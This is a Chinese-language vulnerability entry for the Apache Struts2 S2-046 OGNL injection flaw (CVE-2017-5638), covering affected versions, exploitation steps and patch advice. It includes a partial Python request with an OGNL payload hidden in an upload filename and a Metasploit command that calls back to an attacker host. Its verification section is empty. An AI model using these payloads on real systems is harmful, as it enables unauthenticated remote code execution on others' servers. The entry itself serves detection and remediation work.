---
id: S2-046
title: Struts2 S2-046 远程代码执行漏洞（CVE-2017-5638）
product: struts2
vendor: Apache
version_affected: "2.3.5 - 2.3.31, 2.5 - 2.5.10"
severity: CRITICAL
tags: [rce, ssti, 无需认证]
fingerprint: ["Apache Struts", "Struts2"]
---

## 漏洞描述

与 S2-045 类似，但是输入点在文件上传的 filename 值位置，并需要使用 \\x00 截断。攻击者可以通过构造恶意文件名执行 OGNL 表达式。

## 影响版本

- Apache Struts 2.3.5 - 2.3.31
- Apache Struts 2.5 - 2.5.10

## 前置条件

- 无需认证
- 目标应用有文件上传功能

## 利用步骤

1. 发送带有恶意 filename 的文件上传请求
2. 使用 \\x00 截断绕过限制

## Payload

```python
import socket

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
```



Metasploit 利用:
```bash
msfconsole -q -x "use exploit/multi/http/struts2_content_type_ognl; set RHOSTS target; set TARGETURI /; set RPORT 8080; set LHOST attacker_ip; run"
```

## 验证方法

```bash
# 检查响应头中是否执行了表达式
```

## 修复建议

1. 升级 Apache Struts 至 2.3.32 或 2.5.11+
2. 升级 Struts2 框架
3. 对上传文件名进行严格验证
